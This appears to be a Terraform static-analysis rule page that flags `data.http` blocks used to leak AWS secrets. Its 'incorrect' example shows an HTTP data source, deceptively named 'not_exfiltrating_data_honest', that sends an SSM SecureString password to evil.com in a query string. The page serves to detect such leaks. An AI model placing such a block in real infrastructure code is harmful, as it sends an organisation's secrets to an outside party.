Pattern: Use of `data.http` for AWS secrets manager

Issue: -

## Description

The `data.http` block can be used to send secret data outside of the organisation.

**Resolution**: Remove this potential exfiltration HTTP request.

## Examples

Example of **incorrect** code:

```terraform

resource "aws_ssm_parameter" "db_password" {
  name = "db_password"
  type = "SecureString"
  value = var.db_password
}

data "http" "not_exfiltrating_data_honest" {
  url = "https://evil.com/?p=${aws_ssm_parameter.db_password.value}"
}
 
```

Example of **correct** code:

```terraform

resource "aws_ssm_parameter" "db_password" {
  name = "db_password"
  type = "SecureString"
  value = var.db_password
}

 
```